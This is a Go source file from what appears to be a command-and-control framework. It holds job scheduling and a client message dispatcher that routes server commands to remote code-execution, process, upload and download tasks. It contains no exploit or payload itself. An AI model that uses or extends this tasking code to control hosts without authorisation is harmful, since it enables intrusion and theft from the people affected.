package c2

import (
	"context"
	"errors"
	"fmt"
	"time"

	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/util"
)

var (
	// ErrCannotAssign is an error returned by the 'Schedule' function when the random loop cannot find a valid
	// JobID (unused). This may occur in random circumstances when the Scheduler is overused.
	ErrCannotAssign = errors.New("unable to assign a unused JobID (is Scheduler full?)")

	// DefaultClientMux is the default Session Mux instance that handles the default C2 server and client functions.
	// This operates cleanly with the default Server Mux instance.
	DefaultClientMux = MuxFunc(defaultClientMux)
)

// Job is a struct that is used to track and manage Tasks given to Session Clients. This struct has function callbacks
// that can be used to watch for completion and also offers a Wait function to pause execution until a response is received.
type Job struct {
	ID       uint16
	Type     uint16
	Done     func(*Job)
	Start    time.Time
	Error    string
	Result   *com.Packet
	Session  *Session
	Complete time.Time

	ctx    context.Context
	cancel context.CancelFunc
}

// Mux is an interface that handles Packets when they arrive for Processing.
type Mux interface {
	Handle(*Session, *com.Packet)
}

// Scheduler is a handler that can manage and schedule Packets as Jobs to be sent to a Session and tracked. The
// resulting output (or errors) can be tracked by the resulting Job structs.
type Scheduler struct {
	s    *Server
	jobs map[uint16]*Job
}

// Tasker is an interface that will be tasked with executing a Job and will return an error or a resulting
// Packet with the resulting data. This function is NOT responsible with writing any error codes, the parent caller
// will handle that.
type Tasker interface {
	Thread() bool
	Do(context.Context, *com.Packet) (*com.Packet, error)
}

// MuxFunc is the definition of a Mux Handler func. Once wrapped as a 'MuxFunc', these function aliases can be also
// used in place of the Mux interface.
type MuxFunc func(*Session, *com.Packet)

// Wait will block until the Job is completed or the parent Server is shutdown.
func (j *Job) Wait() {
	<-j.ctx.Done()
}

// IsDone returns true when the Job has received a response.
func (j *Job) IsDone() bool {
	return j.ctx.Err() != nil
}

// IsError returns true when the Job has received a response, but the response is an error.
func (j *Job) IsError() bool {
	return j.ctx.Err() != nil && len(j.Error) > 0
}
func (x Scheduler) newJobID() uint16 {
	var (
		ok   bool
		i, c uint16
	)
	for ; c < 256; c++ {
		i = uint16(util.Rand.Uint32())
		if _, ok = x.jobs[i]; !ok {
			return i
		}
	}
	return 0
}

// Run will execute the provided Task with the provided Packet as the data input. The Session will be used to return
// the results to and will supply the context to run in. THis function may return instantly if the Task is thread
// oriented, but will send the results after completion or error without further interaction.
func Run(t Tasker, s *Session, p *com.Packet) {
	if t.Thread() {
		go run(t, s, p)
	} else {
		run(t, s, p)
	}
}
func run(t Tasker, s *Session, p *com.Packet) {
	s.log.Debug("[%s:Task] Starting Task with JobID %d.", s.ID, p.Job)
	r, err := t.Do(s.ctx, p)
	if r == nil {
		r = new(com.Packet)
	}
	if err != nil {
		s.log.Error("[%s:Task] Received error during Task run: %s!", s.ID, err.Error())
		r.Flags |= com.FlagError
		r.WriteString(err.Error())
	} else {
		s.log.Debug("[%s:Task] Task with JobID %d completed!", s.ID, p.Job)
	}
	r.ID, r.Job = MsgResult, p.Job
	if err := s.write(false, r); err != nil {
		s.log.Error("[%s:Task] Received error sending Task results: %s!", s.ID, err.Error())
	}
}
func defaultClientMux(s *Session, p *com.Packet) {
	s.log.Debug("[%s:Mux] Received packet %q.", s.ID, p.String())
	switch p.ID {
	case MsgCode:
		run(task.TaskCode, s, p)
	case MsgRefresh:
		run(task.TaskRefresh, s, p)
	case MsgUpload:
		run(task.TaskUpload, s, p)
	case MsgProcess:
		run(task.TaskProcess, s, p)
	case MsgDownload:
		run(task.TaskDownload, s, p)
	case MsgHello, MsgPing, MsgSleep, MsgRegistered:
		return
	}
}

// Handle satisfies the Mux interface requirement and will process the received Packet. This function allows
// Wrapped MuxFunc objects to be used directly in place of more complex Mux definitions.
func (m MuxFunc) Handle(s *Session, p *com.Packet) {
	m(s, p)
}

// Handle is the function that inherits the Mux interface. This is used to find and redirect received Jobs. This
// Mux is rarely used in Sessions.
func (x *Scheduler) Handle(s *Session, p *com.Packet) {
	if s == nil || p == nil || p.Job <= 1 {
		return
	}
	switch p.ID {
	case MsgHello, MsgPing, MsgSleep, MsgRegistered:
		return
	}
	if x.jobs == nil || len(x.jobs) == 0 {
		x.s.Log.Warning("[%s:Sched] Received an un-tracked Job ID %d!", s.ID, p.Job)
		return
	}
	j, ok := x.jobs[p.Job]
	if !ok {
		x.s.Log.Warning("[%s:Sched] Received an un-tracked Job ID %d!", s.ID, p.Job)
		return
	}
	x.s.Log.Trace("[%s:Sched] Received response for Job ID %d.", s.ID, j.ID)
	j.Result, j.Complete = p, time.Now()
	if p.Flags&com.FlagError != 0 {
		if err := p.ReadString(&j.Error); err != nil {
			j.Error = err.Error()
		}
	}
	delete(x.jobs, j.ID)
	j.cancel()
	if j.Done != nil {
		s.s.events <- event{j: j, jFunc: j.Done}
	}
}

// Schedule will schedule the supplied Packet to the Session and will return a Job struct. This struct will indicate
// when a response from the client has been received. This function will write the Packet to the resulting Session.
func (x *Scheduler) Schedule(s *Session, p *com.Packet) (*Job, error) {
	if x.jobs == nil {
		x.jobs = make(map[uint16]*Job, 1)
	}
	if p.Job == 0 {
		p.Job = x.newJobID()
		if p.Job == 0 {
			return nil, ErrCannotAssign
		}
	}
	if len(p.Device) == 0 {
		p.Device = s.Device.ID
	}
	if _, ok := x.jobs[p.Job]; ok {
		return nil, fmt.Errorf("job ID %d is already being tracked", p.Job)
	}
	if err := s.Write(p); err != nil {
		return nil, err
	}
	j := &Job{ID: p.Job, Type: p.ID, Start: time.Now(), Session: s}
	j.ctx, j.cancel = context.WithCancel(s.s.ctx)
	x.jobs[p.Job] = j
	return j, nil
}
